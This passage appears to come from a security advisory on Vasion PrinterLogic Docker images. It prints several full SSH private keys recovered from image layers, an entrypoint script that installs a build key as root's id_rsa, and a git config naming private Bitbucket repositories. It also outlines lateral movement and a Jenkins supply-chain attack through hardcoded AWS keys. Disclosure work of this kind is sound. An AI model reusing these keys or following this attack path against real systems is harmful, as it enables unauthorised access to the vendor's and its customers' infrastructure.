ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2M2xijRbElYoTFbvt4gHISVqO9fY7Ad4Bz/cspildbrk6rFRx1M5WD5PLeS6flg1sBUotNgbQih1e/P5z/rwEHF9JZvH/4Sk3nAa+0+hym6vdPZLa6iEq6xbyyQ5jyTs4NjphCXpSkHK3skc8exxkM2H0mUi+7hj4l47UnetLck9rV5TvVHs9gUhjhkiYm1FlesT5WMF6ExOotS3ndi8ZydFdQHbuGJsMKIGyD1d699TqoiP/o82PgKMmuL64APRgbgzVYyyMvFGctg3Pw7dbPwkLoFTQf2gVLdEXm9OBDyyx6/lb4gIcLTrMnZ5zYj08qeo3K8jc4TpyYUVQCo4IHe7O0Ck3CG0oRsXIXVWNK8UMC6hXTQ2zKGN2rX9zhbOvAVhZGJ6/bcKnrxOvGQltdgoV2wTEp0IvqLQg4dOl0eaDT5kPyETdxToaizB85FPrOeWYuYY9SSciViNR945nkcEwq4ALE+fZGSYxIc4PxoN6ygjVxcyvWkLhV2sv6Wk= 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNyc+v6JH6q5M47st8Cs3a7ekwr7TW4j6GCkXupqnDhdcIRXkb9pXyF+0dfPk3X3DrZ1yYSjx9z848POhmecIA9OGAMBqewAQllS5GrkdTH7mAZ1ECTvrjzkZnHAEz95ED2TlI20n4xY06yXZbLIQhM9DjhTlNDP0Vz51spn/xKRyN2hk/MC3TqVRiePkxPhp54OanuxQj74Xes905vFCIXukqKslRKXuZMiPPBr+rXma99Ev09APkJGu+Gf12d4c+7A+iOCDjphQ7IgzMS5qegKVFynX1UPoTUClUZN/oBVOitu3EVAajY7BOOGE4K+EAtxRjiwYfNAb2tajXMcDV8BcKiPu1mR23Q+sr39GOZgfuEcIQt7NvqMnBtNRomOBT7L4JJJ83G7kqP7BtDPS7OTjxNthPQNIMIgPC+rt9RCR/LlUCRSXNVi11el/L1zntHUfNNhsR+s94qjiS9PeXOqqDplpAEW7qIA6OW27cMJHaSHT0TbhZMyMj5qTTf4fUGkfKg5S5+yOUc8Y+ZVLD/62Tmc4EVFMKExB6AY8sormW4KnStBOH//4N0+RobSinClH7pAs8t91H9EZMOb1HWLuh9sC6O6I8Y/7VNjpMRMwPjTVxyWioPfvXL/nYAarQx2T8vHJ0PPhPw9rv7HFg28j7SmwQUJJArOIx1N0d+w== [redacted]@printerlogic.com
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNyc+v6JH6q5M47st8Cs3a7ekwr7TW4j6GCkXupqnDhdcIRXkb9pXyF+0dfPk3X3DrZ1yYSjx9z848POhmecIA9OGAMBqewAQllS5GrkdTH7mAZ1ECTvrjzkZnHAEz95ED2TlI20n4xY06yXZbLIQhM9DjhTlNDP0Vz51spn/xKRyN2hk/MC3TqVRiePkxPhp54OanuxQj74Xes905vFCIXukqKslRKXuZMiPPBr+rXma99Ev09APkJGu+Gf12d4c+7A+iOCDjphQ7IgzMS5qegKVFynX1UPoTUClUZN/oBVOitu3EVAajY7BOOGE4K+EAtxRjiwYfNAb2tajXMcDV8BcKiPu1mR23Q+sr39GOZgfuEcIQt7NvqMnBtNRomOBT7L4JJJ83G7kqP7BtDPS7OTjxNthPQNIMIgPC+rt9RCR/LlUCRSXNVi11el/L1zntHUfNNhsR+s94qjiS9PeXOqqDplpAEW7qIA6OW27cMJHaSHT0TbhZMyMj5qTTf4fUGkfKg5S5+yOUc8Y+ZVLD/62Tmc4EVFMKExB6AY8sormW4KnStBOH//4N0+RobSinClH7pAs8t91H9EZMOb1HWLuh9sC6O6I8Y/7VNjpMRMwPjTVxyWioPfvXL/nYAarQx2T8vHJ0PPhPw9rv7HFg28j7SmwQUJJArOIx1N0d+w== [redacted]@printerlogic.com

kali% cat 2410f7c3221fd364bbd3973e9a9d4a5822470220de3fc62b3f03c805b3c0d18a
-----BEGIN RSA PRIVATE KEY-----
MIIJKgIBAAKCAgEAzcnPr+iR+quTOO7LfArN2u3pMK+01uI+hgpF7qapw4XXCEV5
G/aV8hftHXz5N19w62dcmEo8fc/OPDzoZnnCAPThgDAansAEJZUuRq5HUx+5gGdR
Ak76485GZxwBM/eRA9k5SNtJ+MWNOsl2WyyEITPQ44U5TQz9Fc+dbKZ/8SkcjdoZ
PzAt06lUYnj5MT4aeeDmp7sUI++F3rPdObxQiF7pKirJUSl7mTIjzwa/q15mvfRL
9PQD5CRrvhn9dneHPuwPojgg46YUOyIMzEuanoClRcp19VD6E1ApVGTf6AVTorbt
xFQGo2OwTjhhOCvhALcUY4sGHzQG9rWo1zHA1fAXCoj7tZkdt0PrK9/RjmYH7hHC
ELezb6jJwbTUaJjgU+y+CSSfNxu5Kj+wbQz0uzk48TbYT0DSDCIDwvq7fUQkfy5V
AkUlzVYtdXpfy9c57R1HzTYbEfrPeKo4kvT3lzqqg6ZaQBFu6iAOjltu3DCR2kh0
9E24WTMjI+ak03+H1BpHyoOUufsjlHPGPmVSw/+tk5nOBFRTChMQegGPLKK5luCp
0rQTh//+DdPkaG0opwpR+6QLPLfdR/RGTDm9R1i7ofbAujuiPGP+1TY6TETMD401
ccloqD371y/52AGq0Mdk/LxydDz4T8Pa7+xxYNvI+0psEFCSQKziMdTdHfsCAwEA
AQKCAgEAjFczEg4Tb9YOwubnUqKznLhfLVrGgz0r0pGy+3whjjv6V6O5Yj6aJ831
YQTXmNG32nJVDW6jLlHHngETpL8odSqLlrY3kUf2DANe2ckEz0V1ZoIPFvnx0+Xa
0Xqhv2T4Op2rmWojWkqvdAXsd2U2fsYtkNxMJaXT+0npXC14V2joFj1EtnkO56g0
6isCFnj56WBdLMpCg/dXXndfSX6JlVbUwHMJdBZMOj+deBRsJlxsyOKP4m9/L9k+
uRhUaLQ/QcQPLVwF4fpjFai0/aYZvjqRe7UFGNWulfk3Flzs7fij/vWt1RRQqqDT
naSJeJtECQ7SEsi+1gzPKvTcPlWp4YN3GlMchWMQKmH7xu6LVTZEtmcNsIFwGmzT
xiWO+j9rJlAaRjJ5RDgvHl562IcHDCUWY/U0UAXMdJMpAsOmdvt/FRfsNI7dUoJV
wEGk/WEwyDml5OatHE9rTHMlXSsztg7KPJWXhsPRsEwQQD1hzZibmfvsbxnrlNR/
XnBvgSzzVxSvKU61bYke8k/YNxjMmYvJx2sJDE+FMIbkGFfkidoeajHD94Y14Lhd
8dXXZN+yUWBgTkROfoyU8YopCVvf4X9mdiibPKJQ4Y3BhbMppcoi5oWpdXdhKwQl
Xx7rCXcB3kkb35x8bYo+evQxfN4hzBHvnvLIWJQUKn+CTdUz3kECggEBAOxOpu1S
m+xmfS8D3+STSoaKPGSRmZ4q2T9Nswk8NcCFsS8/ZkqK6UoRfymwKVH5pCl1WZ37
4Fby4O+yiO8noklc26Da5mO2lRoNsc1LbPMqyJCvlERe7eh9+wNjvivDQITaypD4
JXjKWt77pC85TSwb5IP4ou65W+rUIlKq5iM2mXSPg9y4e75FTs+2B4sfbqkrptaH
tsmOmT5dau2zIWbM6hqat/fIj/Tb0JdSfkYDykWnsfujl7w4jK8kux94GM+ICm1k
WXmQ0h6ed4vGK+VZJOfZeV/BLS4pmrs7pF+ovYZUqQZRJFcByntg5KnvoAt0Mb2J
s3wLAwmXqp2JKfECggEBAN7wEqBr2Awn0QJj5RuL9XvuHcAuq1HYniC6fDOriXKh
jzCNV/BdGdA3H+Pr2zK03xx8/B98k5r/Jp3R2fxPwlyQq9Fg+O9GCkPjuMYUhnI+
/xke51ecNVIeAoAod6AKBpMq8rfQB9ANI0Y/q5qYiqOVsFlNzUvrHvYxdORZgQ5Y
1eIRI0EnEfhKtAjhuMPus05+DrCZZQjOOT9ZJc5C4gkj1QoSB5qAhNUVAbnAJUrV
Qx7nQzpJ3cM6KJ6em7eA9gppC/FqjZBUi89AM5Lhrt8Jy6e1MTGWJWCU307qWYQ6
J6DSJDbSriD7hRiRCni2F89KXnjIl0wqx1kw85EVuqsCggEBAMJFmziq3KOKUspv
PgdWDEP1q9bmWMvO4FIJ1/H0vSAtCVEVp0wLTeXl4oxsVlwdh5fJ8UZPx8zT2pdV
SPyMsf/sRmfE7vn1JjmIHq/vnX+AoelJX/ShsqebwtyziKnD2OwgT77FM1FN001U
xlNIoahsuf7BT3pBi07Q3fLmq1Mx1REd18ODK8BujG95cFQxIDIWQBBI/L5R7Kx3
8qu+w+wW9TOwFSSxj6A3gxKU8FkxTn7bchi2Es3cE9T9tpUVkBg1+JSclm653/Tq
RM/1uSrRkeTGRuGxGCrGa34Yd3dpa37fZSJbXSvmvgeWzgbjiMlB2o6/gX6uMu4U
8WCYXpECggEBALkWQ8CgCGx/Gg2L9ghauGI9nMGTfXSkDRRK/xa+0Yw0CXdbwaiz
At1VBsrpY8DDXYB/W6qgeMN0FhFsyjep2EmVarCYe9PbKGaYxyzcmYp8NroaaCLa
c4JLm/PepQJfkHnabEyjD/lxDtohvkzJXEDX4+MgrtLaz4fCI7P5gyXwJxJa/BP5
ZffnvXSqQgWZRZBjI7sGf1VCMVEgqDyIVrUT5KlJsrpY/O8TU61tkwh/6gvcIHpi
HRUaUeLu94TwMlUORXYW6pTrPG/Cc478g3x023nO+pqad0mqD4OrGMqopYHlNV+2
pg6IA0YUFMeHFllo+un4T3RTB9JKy8ymZ6UCggEAM1MBDAm0HbgDJW/79gdOF27v
SDhGLbcq5kScqz39RXnQ0rDy3xKgHi0H+OruLPNviQHVI7n1IALV2MUOxEf7OJRL
JuQjQz+AzEEioHZBGWXJ/xydx3uEQ1Lrk9opHYCgvyy5bqCFJwqzD2DUMWEXokOo
RqZrGNV4O6LB/BaEOakpuGtIdZwZFA153qjaGnSxKBwtMtOJm6KZkOehrqP3jwCQ
f4X/oEibvfJ7EHD1MpJxidjmoiKiLt9ApdRdGirk6K+KYhoJm2iWsJlEHaEuONrz
W0QmzE6bp3F+9+pVuBdkZ0yF/VTynGxM6BK/jsA2xesBbSChYorJyklQ5RUuBg==
-----END RSA PRIVATE KEY-----
kali%

kali% cat ba6d3cc939560607ddb022268532711ebe04a4d3a9091b8e8c021fe18d3e54ad
-----BEGIN OPENSSH PRIVATE KEY-----
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
h30NQI0QFWZrEFAAAAAAEC
-----END OPENSSH PRIVATE KEY-----
kali%

kali% cat e4eef378452637b12bdf3be4b094dbf31815aa135eac4bd32f705cd74e890909
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----

kali% cat f8b7e55b72b82e3dcfc3801441522e87cf9b3a9c8bc10e66ad7ba421ee5cac9c
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
kali%
</code></pre>
<p>These keys are used in shellscripts:    </p>
<p>Content of <code>./078f952821d4306172dbb709574c8db80770a13f649d62863b65597b32d0f294/var/www/vendor/printerlogic/microservice-sdk-pkg/.docker-config/entrypoint.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>kali% cat ./078f952821d4306172dbb709574c8db80770a13f649d62863b65597b32d0f294/var/www/vendor/printerlogic/microservice-sdk-pkg/.docker-config/entrypoint.sh
...
<span style="color: #008000">cd</span> /var/www/app

<span style="color: #408080; font-style: italic"># We need the build key in our dev environment for running some npm stuff; we have access to the key already because</span>
<span style="color: #408080; font-style: italic"># we are running in our bind-mounted source volume</span>
mkdir -p /root/.ssh/
cp /var/www/app/.docker-config/buildkey/key /root/.ssh/id_rsa
chmod <span style="color: #666666">600</span> /root/.ssh/id_rsa
</pre></div>

<p>They may also be used for Bitbucket and Github.</p>
<p>For example, it is possible to extract private information about repositories hosted by Bitbucket.</p>
<p>Content of <code>./078f952821d4306172dbb709574c8db80770a13f649d62863b65597b32d0f294/var/www/vendor/printerlogic/ms-auth-key-pkg/.git/config</code>:</p>
<pre><code>kali% less ./078f952821d4306172dbb709574c8db80770a13f649d62863b65597b32d0f294/var/www/vendor/printerlogic/ms-auth-key-pkg/.git/config
[core]  
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = git@bitbucket.org:printerlogicDev/ms-auth-key-pkg.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "develop"]
        remote = origin
        merge = refs/heads/develop
[remote "composer"]
        url = git@bitbucket.org:printerlogicDev/ms-auth-key-pkg.git
        fetch = +refs/heads/*:refs/remotes/composer/*
</code></pre>
<p>If these keys are used for specific access, an attacker can use them for lateral movements and compromise the Vasion PrinterLogic infrastructure.</p>
<p><a id="va-hardcoded-aws-key"></a></p>
<h2>Details - Hardcoded AWS secret key and Presence of CI/CD scripts</h2>
<p>The Docker instances contain hardcoded AWS secret API keys.</p>
<p>The remaining docker data from previously installed instances also contain scripts regarding Continuous Integration and Continuous Deployment (CI/CD), with configuration of remote Jenkins servers (buildmaster-01.pl-labs.com and buildmaster-02.pl-labs.com).  Using valid AWS secret keys, an attacker can compromise Jenkins servers and ultimately compromise customers using Supply Chain attack.</p>
<p>Extraction of AWS secret key.</p>
